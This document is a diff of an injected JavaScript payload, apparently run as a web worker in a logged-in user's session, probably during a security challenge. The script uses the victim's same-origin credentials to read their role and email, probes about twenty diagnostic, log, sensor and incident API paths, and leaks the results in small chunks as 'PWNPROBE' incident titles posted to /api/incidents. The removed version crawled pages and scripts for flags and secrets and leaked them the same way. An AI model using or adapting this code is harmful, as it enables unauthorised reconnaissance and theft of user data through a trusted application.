@@ -1,104 +1,86 @@
 
 (async () => {
-    const get = async path => {
-        const r = await fetch(path, { credentials: "same-origin" });
-        return { status: r.status, text: await r.text() };
-    };
-
-    const meResponse = await get("/api/me");
-    let me;
-    try { me = JSON.parse(meResponse.text).user; } catch {}
-
-    const report = {
-        identity: me ? {
-            id: me.id,
-            role: me.role,
-            verified: me.verified,
-            email: me.email
-        } : meResponse,
-        pages: [],
-        sources: []
-    };
-
     const paths = [
-        "/diagnostic-access/requests",
-        "/diagnostic-access/requests/6",
-        "/diagnostic-access/requests/new",
-        "/diagnostic-access/profiles",
-        "/diagnostic-access/profiles/6/edit",
-        "/diagnostic-access/profiles/new",
-        "/developer"
+        "/api/diagnostic-access/diagnostic-logs",
+        "/api/diagnostic-access/logs",
+        "/api/diagnostic-access/logs/6",
+        "/api/diagnostic-access/requests/6/records",
+        "/api/diagnostic-access/requests/6/export",
+        "/api/diagnostic-logs",
+        "/api/diagnostic/logs",
+        "/api/diagnostics/logs",
+        "/api/diagnostics",
+        "/api/logs",
+        "/api/logs/diagnostic",
+        "/api/monitoring/logs",
+        "/api/monitoring/events",
+        "/api/monitoring/sensors",
+        "/api/sensors",
+        "/api/sensors/B7",
+        "/api/facilities/5/logs",
+        "/api/facilities/5/history",
+        "/api/incidents/2/logs",
+        "/api/incidents/2/history"
     ];
 
-    const assets = new Set([
-        "/js/api-client.js",
-        "/js/app.js",
-        "/js/link-analyzer.js",
-        "/js/link-analyzer-worker.js"
-    ]);
+    const results = [];
 
     for (const path of paths) {
-        const { status, text: html } = await get(path);
+        for (const method of ["GET", "OPTIONS"]) {
+            try {
+                const r = await fetch(path, {
+                    method,
+                    credentials: "same-origin"
+                });
 
-        const title = html.match(/<title[^>]*>(.*?)<\/title>/i)?.[1];
+                const body = await r.text();
 
-        const links = [...html.matchAll(
-            /href=["']([^"']+)["']/gi
-        )].map(m => m[1]);
-
-        const scripts = [...html.matchAll(
-            /<script[^>]+src=["']([^"']+)["']/gi
-        )].map(m => m[1]);
-
-        scripts.forEach(s => {
-            if (s.startsWith("/")) assets.add(s);
-        });
-
-        const forms = [...html.matchAll(
-            /<form\b[\s\S]*?<\/form>/gi
-        )].map(m => m[0].replace(/\s+/g, " ").slice(0, 1000));
-
-        report.pages.push({
-            path,
-            status,
-            title,
-            links: links.filter(x =>
-                /diagnostic|log|access|developer|monitor/i.test(x)
-            ),
-            forms
-        });
-    }
-
-    for (const src of assets) {
-        try {
-            const { status, text: js } = await get(src);
-
-            const matches = js.split("\n")
-                .map((line, i) => `${i + 1}: ${line.trim()}`)
-                .filter(line =>
-                    /diagnostic|log|audit|support|bundle|master|pwn|flag|api\//i.test(line)
-                )
-                .slice(0, 35);
-
-            report.sources.push({ src, status, matches });
-        } catch (e) {
-            report.sources.push({ src, error: String(e) });
+                results.push({
+                    path,
+                    method,
+                    status: r.status,
+                    allow: r.headers.get("Allow"),
+                    body: body.slice(0, 700)
+                });
+            } catch (e) {
+                results.push({
+                    path, method, error: String(e)
+                });
+            }
         }
     }
 
-    const output = JSON.stringify(report, null, 2).slice(0, 6500);
+    const me = await fetch("/api/me", {
+        credentials: "same-origin"
+    }).then(r => r.json());
 
-    for (let i = 0; i < output.length; i += 80) {
-        const title =
-            `MMINFO-${String(i / 80 + 1).padStart(3, "0")}:` +
-            output.slice(i, i + 80);
+    const report = JSON.stringify({
+        identity: {
+            role: me.user?.role,
+            email: me.user?.email
+        },
+        results: results.filter(x =>
+            x.status !== 404 || x.error
+        ),
+        tested: results.map(x => ({
+            path: x.path,
+            method: x.method,
+            status: x.status,
+            allow: x.allow
+        }))
+    });
 
+    const chunks = report.match(/[\s\S]{1,75}/g) || [];
+
+    for (let i = 0; i < chunks.length; i++) {
         await fetch("/api/incidents", {
             method: "POST",
             credentials: "same-origin",
-            headers: { "Content-Type": "application/json" },
+            headers: {
+                "Content-Type": "application/json"
+            },
             body: JSON.stringify({
-                title,
+                title: `PWNPROBE-${String(i+1).padStart(3,"0")}: ${chunks[i]}`,
                 facility: "Meridian-2",
                 severity: "Watch"
             })
@@ -107,6 +89,6 @@
 
     self.postMessage({
         type: "progress",
-        message: "MASTER MIND RECON COMPLETE"
+        message: "PWNPROBE_COMPLETE"
     });
 })();
